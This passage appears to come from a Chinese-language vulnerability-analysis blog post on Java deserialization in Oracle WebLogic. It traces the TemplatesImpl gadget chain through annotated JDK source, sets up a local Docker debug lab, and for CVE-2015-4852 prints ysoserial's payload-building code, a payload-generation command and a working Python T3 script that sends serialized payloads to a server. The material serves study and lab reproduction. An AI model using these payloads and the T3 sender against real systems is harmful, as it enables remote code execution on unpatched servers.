<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties(); <span class="comment">// 1 跟进newTransformer()函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory); <span class="comment">// 2 实例化了TransformerImpl,跟进getTransletInstance()函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 3 令_name为非空往下进行</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses(); <span class="comment">// 4 令_class为空,跟进defineTransletClasses()函数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                _class[_transletIndex].getConstructor().newInstance(); <span class="comment">// 8 使用newInstance()触发static代码,至此代码利用完成</span></span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">            NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); <span class="comment">// 5 确保_tfactory成员具有getExternalExtensionsMap()函数,即需是一个TransformerFactoryImpl类</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">// 6 使用了loader.defineClass()加载类字节码,但是还缺少static代码的触发条件</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; <span class="comment">// 7 令superClass为ABSTRACT_TRANSLET,即父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet,使_transletIndex更新</span></span><br><span class="line">                _transletIndex = i; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>我们看一下最终的payload实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5971610431559700674L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">( DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">( DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Foo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">8207363842866235160L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="comment">// 引入了三个必要类</span></span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将cmd写入到StubTransletPayload类的静态代码中</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// 为重复利用采用随机命名</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    <span class="comment">// 传入父类类型,对应调用链第7个地方,但是_transletIndex默认为0,如果我们把payload直接放在第1位是不会有影响的</span></span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 传入payload的字节码,至于这里为什么要引入一个Foo类我也不太清楚,去掉是不会有影响的</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对应调用链第3个地方</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    <span class="comment">// 对应调用链第5个地方,但是其实_tfactory是被transient修饰的,是不参与反序列化的,它在readObject是会进行重构的,删除无影响</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebLogic环境搭建复杂，一般使用docker，可参考此<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html">博客</a></p>
<h3 id="weblogic-10-3-6-0"><a href="#weblogic-10-3-6-0" class="headerlink" title="weblogic: 10.3.6.0"></a>weblogic: 10.3.6.0</h3><blockquote>
<p>参考<a href="vulhub/weblogic%E7%89%88%E6%9C%AC">vulhub&#x2F;weblogic版本</a></p>
</blockquote>
<ol>
<li><p>创建docker-compose.yml</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">weblogic:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">vulhub/weblogic</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">            <span class="attr">debugFlag:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>运行<code>docker-compose up -d</code></p>
</li>
<li><p>把weblogic的源码和jdk包拷出来</p>
<blockquote>
<p>要是源码太多了，就只复制wlserver出来就好</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp [weblogic id]:/root ./root</span><br></pre></td></tr></table></figure>
</li>
<li><p>IDEA打开<code>/root/Oracle/Middleware/wlserver_10.3/</code>目录</p>
</li>
<li><p>把Middleware目录下所有的*.jar包都放在一个test的文件夹里（同名.jar会有影响，比如CVE-2020-14645）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir test &amp;&amp; find ./ -name &#x27;*.jar&#x27; -exec cp &#123;&#125; ./test/ \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在<code>Project Settings-&gt;Libraries</code>下添加test目录</p>
</li>
<li><p>前往<code>Project Settings-&gt;Project</code>，选用WebLogic自带的jdk1.6</p>
</li>
<li><p>创建remote server，配置远程调试的IP（localhost）和端口（8453），点击debug，出现以下信息即为成功</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connected to the target VM, address: &#x27;localhost:8453&#x27;, transport: &#x27;socket&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>（附）抓取流量</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br><span class="line">apt-get clean</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install tcpdump</span><br><span class="line">tcpdump -w /tmp/tcp.cap</span><br><span class="line">docker cp [weblogic id]:/tmp/tcp.cap ./</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="weblogic-12-2-1-4"><a href="#weblogic-12-2-1-4" class="headerlink" title="weblogic: 12.2.1.4"></a>weblogic: 12.2.1.4</h3><blockquote>
<p>参考<a target="_blank" rel="noopener" href="https://hub.docker.com/_/oracle-weblogic-server-12c">官网</a>，后面的CVE-2020-13645会用到</p>
</blockquote>
<ol>
<li><p>在当前路路径创建<code>domain.properties</code>文件</p>
<blockquote>
<p>注意密码需要至少8个字符，且至少有1个数字或特殊符号，否则会报错</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=myadminusername</span><br><span class="line">password=myadminpassword!</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建<code>docker-compose.yml</code>文件</p>
<blockquote>
<p>默认是生产模式，所以这里把PRODUCTION_MODE设为””，否则无法调试</p>
<p>DOMAIN_NAME默认为空，这里设置为”base_domain”，否则会报找不到文件错误</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">weblogic:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">store/oracle/weblogic:12.2.1.4-dev-200117</span></span><br><span class="line">        <span class="attr">environment:</span></span><br><span class="line">            <span class="attr">DOMAIN_NAME:</span> <span class="string">&quot;base_domain&quot;</span></span><br><span class="line">            <span class="attr">debugFlag:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">            <span class="attr">PRODUCTION_MODE:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="attr">ADMINISTRATION_PORT_ENABLED:</span> <span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">            <span class="attr">source:</span> <span class="string">./</span></span><br><span class="line">            <span class="attr">target:</span> <span class="string">/u01/oracle/properties</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;9002:9002&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动docker</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
</li>
<li><p>拷贝源码和jdk</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp [weblogic id]:/u01 ./u01</span><br></pre></td></tr></table></figure>
</li>
<li><p>后面步骤和上面一样</p>
</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><h4 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
</blockquote>
<p><strong>payload</strong></p>
<p>生成反序列化payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-<span class="built_in">all</span>.jar CommonsCollections1 <span class="string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>祖传T3脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_send</span>(<span class="params">ip, port, file</span>):</span><br><span class="line">    t3_header = <span class="string">&#x27;t3 10.3.6\nAS:255\nHL:19\n\n&#x27;</span></span><br><span class="line">    host = (ip, <span class="built_in">int</span>(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">&#x27;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000&#x27;</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">&#x27;%s%s&#x27;</span> % (<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t3_send(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;7001&#x27;</span>,<span class="string">&#x27;poc.ser&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>漏洞利用的原理利用<code>TransformedMap.setValue()</code>或者<code>LazyMap.get()</code>（ysoserial用的就是这个方法）方法来触发<code>Apache Commons Collections</code>，而在我们的<code>AnnotationInvocationHandler</code>类中，都含有这两个方法的调用，下面我们来看一下它们的入口点</p>
